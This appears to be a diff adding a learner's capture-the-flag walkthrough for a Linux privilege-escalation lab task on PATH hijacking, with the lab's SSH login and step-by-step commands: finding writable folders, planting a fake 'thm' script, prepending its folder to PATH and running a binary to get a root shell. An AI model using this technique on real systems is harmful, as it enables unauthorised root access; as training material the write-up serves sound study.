@@ -1,0 +1,72 @@
+TASK_10
+Linux Privilege Escalation > Task 10 "PATH"
+
+______ssh creds______
+|Username: karen    |
+|Password: Password1|
+---------------------
+
+
+First of all we have to define the difference between PATH and path
+In Linux $PATH is an evironmental variable that tells the operative system where to search for executables when its absolute path is not defined and the command is not built into the shell.
+Path is just the absolute path of a file and applies to everything
+
+When we try to exploit this privilege escalation vector is critical to answer 4 questions. Lets try it on our target (connect via ssh now)!
+    1.  What folders are located under $PATH?
+        input   :   echo $PATH
+        outpt   :   /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+    2.  Does your current user have write privileges for any of these folders?
+        input   :   find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
+        outpt   :   dev         snap
+                    etc         sys
+                    home        tmp
+                    proc        usr
+                    run         var
+        Tip     :   "2>/dev/null" sends the errors to /dev/null in order not to be printed into the terminal as it can print a vast amount of those! + "cut -d '/" -f 2" means that if we have a string "foo/bar/baz" it will be printed only the "bar" + "sort -u" removes duplicates
+        As we see we have a handfull of writable folders into PATH
+
+    3.  Can you modify $PATH?
+        Lets try it! Choose a random folder and try adding it
+        input   :   export PATH=/ubuntu:$PATH
+        outpt   :   //Blank. Hit "echo $PATH" to verify it
+
+    4.  Is there a script/application you can start that will be affected by this vulnerability?
+        Now for the bloody part!
+        If we search inside the "/home" folder we see 3 additional folders. Inside "/murdoch" folder we see an executable and a python script. We can't see the content of the executable, but seems that the python script calls another executable called "thm". Should we run them?
+        input   :   python3 thm.py
+        outpt   :   ...
+                    SyntaxError: invalid syntax
+        Ahh syntax error FUCK IT WE DONT CARE
+
+        input   :   ./test
+        outpt   :   sh: 1: thm: not found
+        It seems that we have the right to run the script but thm executable is not found. If we search for it ("find / -name thm 2>/dev/null") we see that is not found in the whole system
+
+        So lets make one with the same title but its containt will escalate us in privileges
+        input   :   nano thm
+        ###
+        #!/bin/bash
+        sudo su
+        ###
+        outpt   :   //Blank. Hit "ls -la" or "cat thm" to verify it
+
+        Then give it the required rights to run
+        input   :   chmod +x thm
+        outpt   :   //Blank. Hit "ls -la" to verify it
+
+        Then add the current working folder to PATH
+        input   :   export PATH=/home/murdoch:$PATH
+        outpt   :   //Blank. Hit "echo $PATH" to verify it
+
+        And run it!
+        input   :   ./test
+        outpt   :   //Root Shell opens. Hit "whoami" to verify it
+
+Search for the flag!
+input   :   cat <PATH_TO_FLAG>
+outpt   :   <FLAG>.txt
+
+
+
+made by @gr1m.r3ap3r
